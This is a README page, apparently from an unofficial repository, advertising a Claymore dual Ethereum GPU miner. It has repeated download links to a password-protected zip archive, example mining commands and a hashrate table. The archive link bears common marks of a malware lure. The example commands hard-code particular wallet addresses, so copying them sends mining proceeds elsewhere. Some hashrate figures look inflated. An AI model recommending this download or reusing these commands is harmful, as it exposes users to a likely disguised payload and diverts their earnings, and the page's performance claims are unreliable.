<p align="center">
<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.dual.ethereum.miner.v15.0.-.widows.Password-claymore.zip" alt="claymore ethereum miner">
<img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/5eth.jpg" /></a>
</p>

<p align="center">
<img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/Activity/date.svg" />

 

 <img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/Activity/uptime.svg" />
</p>

# Claymore's Dual Ethereum AMD+NVIDIA GPU Miner v15.0 (Windows/Linux)
We put our souls into the development of the Claymore Dual Miner!

Claymore today used by thousands of satisfied users.

So, thank you so much for joining us!

<p>Claymore Miner is high performance Ethereum (ETH) and ERC20 tokens  miner, with the official full Windows / Linux support.
</p>
<p align="center">
<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.dual.ethereum.miner.v15.0.-.widows.Password-claymore.zip" alt="claymore ethereum miner">
<img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/ethereum-hashrate.png" /></a>
</p>

<p>Claymore is one of the most efficient and convenient miners to date, which is why it won the general recognition of miners.
</p>

## Table of Contents
- [Features, requirements, and limitations](#Features-requirements-and-limitations)
- [Download](#Download)
- [Claymore Dual Miner Setup](#claymore-dual-miner-setup)
- [Example](#example)
- [Auto Restart](#claymore-minerauto-restart)
- [Hashrate](#hashrate)
- [Troubleshooting guide](#troubleshooting-guide)


## Features, requirements, and limitations

* Highly optimized OpenCL and CUDA cores for maximum ethash mining speed
* Official Windows / Linux support.
* Nicehash support.
* Automatic GPU configuration.
* Supports AMD Vega, 580/570/480/470, 460/560, Fury, 390/290 and older AMD GPUs with enough VRAM
* Supports Nvidia 10x0 and 9x0 series as well as older cards with enough VRAM
* Optional "green" kernels for RX580/570/560/480/470/460 to lower the power consumption by 2-3% with small, or no drop in hashrate
* Lowest developer fee of 1% (35 seconds defvee mining per each 90 minutes)
* Dual mining ethash/Blake2s
* Advanced statistics: actual difficulty of each share, effective hashrate at the pool, and optional showing of estimated income in USD
* DAG file generation in the GPU for faster start-up and DAG epoch switches
* Supports all ethash mining pools and stratum protocols
* Watchdog that monitors your GPU threads, if they stop hashing for a few minutes, miner restarts itself
* Startup monitor, if miner can't init GPU's and start mining in a defined time, restarts itself or runs a user defined script
* Monitoring of GPU temperature, and if a critical temperature is reached, that particular GPU is turned off until it cools down
* Set system shutdown temperature, to protect your GPU's from overheating
* API for rig monitoring


<img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/ethereum-mining.jpg" width="795" >


## Download

<p>
<a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.dual.ethereum.miner.v15.0.-.widows.Password-claymore.zip" alt="claymore ethereum miner">
<img src="https://github.com/Claymore-Dual/Claymore-Dual-Miner/blob/master/files/git-files/download-btn.png" width="300" ></a></p>

* Binary releases: https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases
* Git tree: https://github.com/Claymore-Dual/Claymore-Dual-Miner.git
  * Clone with `git clone https://github.com/Claymore-Dual/Claymore-Dual-Miner.git`  :hammer:
  
## Claymore Dual Miner Setup

<li>Step 1 - Install your GPUs and set up your computer</li>
<li>Step 2 - <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/releases/download/15.0/Claymore.s.dual.ethereum.miner.v15.0.-.widows.Password-claymore.zip">Download latest claymore miner</a></li>
<li>Step 3 - Get an Ethereum wallet (<a target="_blank" rel="noopener noreferrer" href="https://github.com/ethereum/mist/releases">Mist</a> or MyEtherWallet)</li>
<li>Step 4 - Join a <a href="https://github.com/Claymore-Dual/Claymore-Dual-Miner/wiki/ETH-Mining-Pools-List-(updated-2019)">mining pool</a> (Create .bat file or config)</li>
<li>Step 5 - Start mining!</li>

## Example

### Windows:

### Ethereum - Ethermine.org
```batch
EthDcrMiner64.exe -pool eu1.ethermine.org:4444 -wal 0x9147460980c93629e775783148591b7d0a0cbf2d -worker Rig1 -pass x -log 0 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 
pause
```

### Ethereum - eth-solo.pool-node.com
```batch
EthDcrMiner64.exe -pool eth-solo.pool-node:5000 -wal 0x6a6ee2d7d06aa9b47b25957ec1e1d8124837ffec -worker Rig1 -pass x -log 0 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 
pause
```

### Ethereum - sparkpool.com
```batch
EthDcrMiner64.exe -pool eu.sparkpool.com:3333 -wal 0x9147460980c93629e775783148591b7d0a0cbf2d -worker Rig1 -epsw x -dbg -1 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 
pause
```
### Ethereum - f2pool.com
```batch
EthDcrMiner64.exe -pool eth.f2pool.com:8008 -wal 0x1a0e2c4cd699cee12672adc223fdb30b93253eba -worker Rig1 -epsw x -dbg -1 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 
pause
```

## Ethereum - NiceHash
```batch
EthDcrMiner64.exe -epool stratum+tcp://daggerhashimoto.eu-new.nicehash.com:3353 -ewal 1Pz3EcHsRuJkraNRACUrBrLaxiTPP1VHJZ -epsw x -allpools 1
pause
```

### Ethereum - Flexpool.io
```batch
EthDcrMiner64.exe -pool eu.flexpool.io:4444 -wal 0x9147460980c93629e775783148591b7d0a0cbf2d -worker Rig1 -pass x -log 0 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 
pause
```

### Ethereum - Flexpool.io (Secure/SSL)
```batch
EthDcrMiner64.exe -pool ssl://eu.flexpool.io:5555 -wal 0x9147460980c93629e775783148591b7d0a0cbf2d -worker Rig1 -pass x -log 0 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 
pause
```


### Linux:

```bash
./ethdcrminer64 -epool eu1.ethermine.org:4444 -ewal 0x1a0e2c4cd699cee12672adc223fdb30b93253eba -eworker Rig1 -epsw x -mode 1 -dbg -1 -mport 0 -etha 0 -ftime 55 -retrydelay 1 -tt 79 -ttli 77 -tstop 89 
```

###


###

## Claymore Miner Auto Restart 

In Windows if you’ve  configured your miner through a batch file then you can easily make the script to loop with this simple command.
```batch
your miner configuration goes here
goto start`
```

**Example:**
```batch
:start
EthDcrMiner64.exe -pool eth-eu2.nanopool.org:9999 -wal 0x1a0e2c4cd699cee12672adc223fdb30b93253eba -worker Rig1 -pass x -log 0 -tt 75 -tstop 85 -tstart 70 -fanmin 30 -Rmode 1 -fret 1 -rate 1 
goto start
```
 
##  Hashrate

<table class="responsive-table mar">
<thead>
		<tr>
			<td>Model</td>
			<td>Hashrate, MH/s</td>
		</tr>
</thead>		
<tbody>		
		<tr>
			<td data-title="Model">AMD RX Vega 64</td>
			<td data-title="MH/s">39,69</td>
		</tr>
		<tr>
			<td data-title="Model">AMD Vega Frontier Edition</td>
			<td data-title="MH/s">38,59</td>
		</tr>
		<tr>
			<td data-title="Model">AMD RX Vega 56</td>
			<td data-title="MH/s">35,86</td>
		</tr>
		<tr>
			<td data-title="Model">NVIDIA GTX 1080 Ti</td>
			<td data-title="MH/s">33,4-55</td>
		</tr>
		<tr>
			<td data-title="Model">AMD RX 480</td>
			<td data-title="MH/s">30,04</td>
		</tr>
		<tr>
			<td data-title="Model">NVIDIA GTX 1070</td>
			<td data-title="MH/s">28,69</td>
		</tr>
		<tr>
			<td data-title="Model">NVIDIA GTX 1080</td>
			<td data-title="MH/s">34,63</td>
		</tr>
		<tr>
			<td data-title="Model">AMD R9 Fury Nano</td>
			<td data-title="MH/s">26,26</td>
		</tr>
		<tr>
			<td data-title="Model">AMD R9 290X</td>
			<td data-title="MH/s">25,75</td>
		</tr>
		<tr>
			<td data-title="Model">AMD RX 470</td>
			<td data-title="MH/s">30,00</td>
		</tr>
		<tr>
			<td data-title="Model">AMD RX 570</td>
			<td data-title="MH/s">30,00</td>
		</tr>
		<tr>
			<td data-title="Model">AMD RX 580</td>
			<td data-title="MH/s">30,00</td>
		</tr>
		<tr>
			<td data-title="Model">NVIDIA GTX 970</td>
			<td data-title="MH/s">22,21</td>
		</tr>
		<tr>
			<td data-title="Model">NVIDIA GTX 980 Ti</td>
			<td data-title="MH/s">21,57</td>
		</tr>
		<tr>
			<td data-title="Model">AMD R9 380X</td>
			<td data-title="MH/s">20,63</td>
		</tr>
		<tr>
			<td data-title="Model">NVIDIA GTX 980</td>
			<td data-title="MH/s">20,28</td>
		</tr>
		<tr>
			<td data-title="Model">NVIDIA GTX 1060</td>
			<td data-title="MH/s">20,13</td>
		</tr>
		<tr>
			<td data-title="Model">AMD R9 390</td>
			<td data-title="MH/s">18,00</td>
		</tr>
		<tr>
			<td data-title="Model">AMD R9 380</td>
			<td data-title="MH/s">18,00</td>
		</tr>
		<tr>
			<td data-title="Model">NVIDIA GTX 1050 Ti</td>
			<td data-title="MH/s">12,62</td>
		</tr>
		<tr>
			<td data-title="Model">NVIDIA GTX 1050 4 GB</td>
			<td data-title="MH/s">11,90</td>
		</tr>
		<tr>
			<td data-title="Model">AMD RX 460 4 GB</td>
			<td data-title="MH/s">11,20</td>
		</tr>
		<tr>
			<td data-title="Model">AMD RX 550 4 GB</td>
			<td data-title="MH/s">10,50</td>
		</tr>
		<tr>
			<td data-title="Model">RX 5700 XT</td>
			<td data-title="MH/s">51,50</td>
		</tr>
		<tr>
			<td data-title="Model">RX 5600 XT</td>
			<td data-title="MH/s">42,70</td>
		</tr>
		<tr>
			<td data-title="Model">RX 5500 XT</td>
			<td data-title="MH/s">26,10</td>
		</tr>
		<tr>
			<td data-title="Model">Radeon VII</td>
			<td data-title="MH/s">78,10</td>
		</tr>
		<tr>
			<td data-title="Model">Nvidia P104-100</td>
			<td data-title="MH/s">40,16</td>
		</tr>
	</tbody>
</table>
 
 
## Troubleshooting guide

### Error -61 is CL_INVALID_BUFFER_SIZE
<p>Miner cannot assign enough GPU memory.</p>
<p>And Just a friendly reminder that if your card has under 4GB of VRAM, it cannot be used to mine.</p>
<p>If some other miner works fine - use it, but it will stop working soon too. The most probable reason (it's related to both nvidia and amd cards:
https://social.technet.microsoft.com/Forums/en-US/15b9654e-5da7-45b7-93de-e8b63faef064/windows-10-does-not-let-cuda-applications-to-use-all-vram-on-especially-secondary-graphics-cards?forum=win10itprohardware</p>
<p>Exact size of reserved GPU memory depends on drivers and Windows build, but the values are similar.</p>

&nbsp;

### Error - Probably you are trying to mine Ethereum fork. Please specify "-allcoins 1" or "-allpools 1" option

<p>If you see this error, then you should update your miner or connect to another pool.</p>

<p>If you want to mine some ETH fork, always specify "<code>-allcoins 1</code>", it will work in all versions. If you don't do it, it may work in some old versions and won't work in recent versions.</p>

**Example:**
```batch
:start
EthDcrMiner64.exe -epool eu1.ethermine.org:4444 -ewal YOUR_WALLET -eworker YOUR_WORKER -epsw x -allcoins 1
goto start
```
<p>or </p>

```batch
:start
EthDcrMiner64.exe -epool eu1.ethermine.org:4444 -ewal YOUR_WALLET -eworker YOUR_WORKER -epsw x -allpools 1
goto start
```
